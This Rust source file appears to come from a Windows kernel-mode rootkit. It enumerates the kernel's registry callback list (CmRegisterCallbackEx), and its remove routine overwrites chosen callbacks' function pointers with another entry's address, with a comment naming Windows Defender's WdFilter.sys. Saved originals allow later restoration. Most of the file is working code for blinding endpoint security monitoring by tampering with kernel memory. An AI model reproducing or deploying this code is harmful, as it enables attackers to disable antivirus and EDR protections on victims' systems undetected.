use {
    alloc::vec::Vec,
    spin::{Lazy, Mutex},
    ntapi::ntldr::LDR_DATA_TABLE_ENTRY,
    wdk_sys::{NTSTATUS, STATUS_SUCCESS},
};

use {
    common::{
        enums::Callbacks,
        structs::CallbackInfoOutput
    },
    crate::{
        list_modules,
        error::ShadowError, 
        lock::with_push_lock_exclusive,
        data::{CallbackRestaure, CM_CALLBACK},
        callback::find_callback::{
            find_callback_address, CallbackResult
        },
    },
};

/// Structure representing the Callback Registry.
pub struct CallbackRegistry;

const MAX_CALLBACK: usize = 100;

/// Stores information about removed callbacks.
///
/// This static variable holds a list of callbacks that were removed and are protected by a `Mutex`
/// to ensure thread-safe access. It is initialized with a capacity of `MAX_CALLBACK`.
static mut INFO_CALLBACK_RESTAURE_REGISTRY: Lazy<Mutex<Vec<CallbackRestaure>>> = Lazy::new(|| 
    Mutex::new(Vec::with_capacity(MAX_CALLBACK))
);

/// Implement a feature for the callback CmRegisterCallbackEx.
impl CallbackRegistry {
    /// Restores a previously removed callback by its index.
    ///
    /// # Arguments
    ///
    /// * `callback` - The type of callback to be restored (e.g., process, thread, registry).
    /// * `index` - The index of the callback to restore.
    ///
    /// # Returns
    ///
    /// * `Ok(STATUS_SUCCESS)` - A success state if the callback is successfully restored.
    /// * `Err(ShadowError)` - A specific error if the callback cannot be restored.
    pub unsafe fn restore(callback: Callbacks, index: usize) -> Result<NTSTATUS, ShadowError> {
        // Lock the removed callbacks to ensure thread-safe access
        let mut callbacks_info = INFO_CALLBACK_RESTAURE_REGISTRY.lock();
        
        // Locating the target callback index
        let index = callbacks_info
            .iter()
            .position(|c| c.callback == callback && c.index == index)
            .ok_or(ShadowError::IndexNotFound(index))?;

        // Retrieve the callback address based on the callback type
        let (callback, count, lock) = match find_callback_address(&callback)? {
            CallbackResult::Registry(addr) => addr,
            _ => return Err(ShadowError::CallbackNotFound)
        };

        // Getting a lock to perform the restore operation
        with_push_lock_exclusive(lock as *mut u64, || {
            let count = *(count as *mut u32) + 1;
            let mut pcm_callback = callback as *mut CM_CALLBACK;

            for i in 0..count {
                if pcm_callback.is_null() {
                    break;
                }
    
                if i == index as u32 {
                    // If the index is matched, restore from the list
                    (*pcm_callback).Function = callbacks_info[index].address;
                    callbacks_info.remove(index);

                    return Ok(STATUS_SUCCESS);
                }
    
                pcm_callback = (*pcm_callback).List.Flink as *mut CM_CALLBACK;
            }

            Err(ShadowError::RestoringFailureCallback)
        })
    }

    /// Removes a callback from the specified routine.
    /// 
    /// # Arguments
    /// 
    /// * `target_callback` - Pointer to the callback information input.
    /// 
    /// # Returns
    /// 
    /// * `Ok(STATUS_SUCCESS)` - if the callback is successfully removed.
    /// * `Err(ShadowError)` - if the callback address cannot be found.
    pub unsafe fn remove(callback: Callbacks, index: usize) -> Result<NTSTATUS, ShadowError> {
        // Retrieve the callback address based on the callback type
        let (callbacks, count, lock) = match find_callback_address(&callback)? {
            CallbackResult::Registry(addr) => addr,
            _ => return Err(ShadowError::CallbackNotFound)
        };

        // Getting a lock to perform the remove operation
        with_push_lock_exclusive(lock as *mut u64, || {
            let count = *(count as *mut u32) + 1;
            let mut pcm_callback = callbacks as *mut CM_CALLBACK;
            let mut callbacks_info = INFO_CALLBACK_RESTAURE_REGISTRY.lock();
            let mut prev_addr = 0;
    
            for i in 0..count {
                if i == 1 {
                    // Here we make an exchange, changing the target address to `WdFilter.sys`
                    prev_addr = (*pcm_callback).Function;
                }
    
                if pcm_callback.is_null() {
                    break;
                }
    
                if i == index as u32 {
                    let callback_restaure = CallbackRestaure {
                        index,
                        callback,
                        address: (*pcm_callback).Function,
                        ..Default::default()
                    };
    
                    // If the index is matched, remove from the list
                    (*pcm_callback).Function = prev_addr;
                    callbacks_info.push(callback_restaure);

                    return Ok(STATUS_SUCCESS);
                }
    
                pcm_callback = (*pcm_callback).List.Flink as *mut CM_CALLBACK;
            }

            Err(ShadowError::RemoveFailureCallback)
        })
    }

 
}

/// Methods related to callback enumeration
impl CallbackRegistry {
    /// Searches for a module associated with a callback and updates callback information.
    /// 
    /// # Arguments
    /// 
    /// * `target_callback` - Pointer to the callback information input.
    /// * `callback_info` - Pointer to the callback information output.
    /// * `information` - Pointer to a variable to store information size.
    /// 
    /// # Returns
    /// 
    /// * Status of the operation. `STATUS_SUCCESS` if successful, `STATUS_UNSUCCESSFUL` otherwise.
    pub unsafe fn enumerate(callback: Callbacks) -> Result<Vec<CallbackInfoOutput>, ShadowError> {
        let mut callbacks: Vec<CallbackInfoOutput> = Vec::new();

        let (callback, count, lock) = match find_callback_address(&callback)? {
            CallbackResult::Registry(addr) => addr,
            _ => return Err(ShadowError::CallbackNotFound)
        };

        let (mut ldr_data, module_count) = list_modules()?;
        let start_entry = ldr_data;

        let count = *(count as *mut u32) + 1;
        let mut pcm_callback = callback as *mut CM_CALLBACK;

        with_push_lock_exclusive(lock as *mut u64, || {
            for i in 0..count as isize {
                if pcm_callback.is_null() {
                    break;
                }

                // Iterate over the loaded modules
                for _ in 0..module_count {
                    let start_address = (*ldr_data).DllBase;
                    let image_size = (*ldr_data).SizeOfImage;
                    let end_address = start_address as u64 + image_size as u64;
                    let addr = (*pcm_callback).Function;
    
                    if addr > start_address as u64 && addr < end_address {
                        let buffer = core::slice::from_raw_parts(
                            (*ldr_data).BaseDllName.Buffer,
                            ((*ldr_data).BaseDllName.Length / 2) as usize,
                        );    
    
                        // Store the callback information
                        let mut name = [0u16; 256];
                        let length = core::cmp::min(buffer.len(), 255);
                        name[..length].copy_from_slice(&buffer[..length]);

                        callbacks.push(CallbackInfoOutput {
                            index: i as u8,
                            address: addr as usize,
                            name,
                            ..Default::default()
                        });

                        break;
                    }
    
                    // Go to the next module in the list
                    ldr_data = (*ldr_data).InLoadOrderLinks.Flink as *mut LDR_DATA_TABLE_ENTRY;
                }
    
                // Reset ldr_data for next callback
                ldr_data = start_entry;
                
                pcm_callback = (*pcm_callback).List.Flink as *mut CM_CALLBACK;
            }    

            Ok(callbacks)
        })
    }
    
    /// List of callbacks currently removed.
    /// 
    /// # Arguments
    /// 
    /// * `target_callback` - Pointer to the callback information input.
    /// * `callback_info` - Pointer to the callback information output.
    /// * `information` - Pointer to a variable to store information size.
    /// 
    /// # Returns
    /// 
    /// * Status of the operation. `STATUS_SUCCESS` if successful, `STATUS_UNSUCCESSFUL` otherwise.
    pub unsafe fn enumerate_removed() -> Result<Vec<CallbackInfoOutput>, ShadowError> {
        let mut callbacks: Vec<CallbackInfoOutput> = Vec::new();

        let callbacks_removed = INFO_CALLBACK_RESTAURE_REGISTRY.lock();
        let (mut ldr_data, module_count) = list_modules()?;
        let start_entry = ldr_data;

        for (i, callback) in callbacks_removed.iter().enumerate() {
            for _ in 0..module_count {
                let start_address = (*ldr_data).DllBase;
                let image_size = (*ldr_data).SizeOfImage;
                let end_address = start_address as u64 + image_size as u64;

                if callback.address > start_address as u64 && callback.address < end_address {
                    let buffer = core::slice::from_raw_parts(
                        (*ldr_data).BaseDllName.Buffer,
                        ((*ldr_data).BaseDllName.Length / 2) as usize,
                    );
                    
                    // Store the callback information
                    let mut name = [0u16; 256];
                    let length = core::cmp::min(buffer.len(), 255);
                    name[..length].copy_from_slice(&buffer[..length]);

                    callbacks.push(CallbackInfoOutput {
                        index: callback.index as u8,
                        address: callback.address as usize,
                        name,
                        ..Default::default()
                    });

                    break;
                }                
                
                // Move to the next module
                ldr_data = (*ldr_data).InLoadOrderLinks.Flink as *mut LDR_DATA_TABLE_ENTRY;
            }

            // Reset the module list pointer for the next callback
            ldr_data = start_entry;
        }

        Ok(callbacks)
    }
}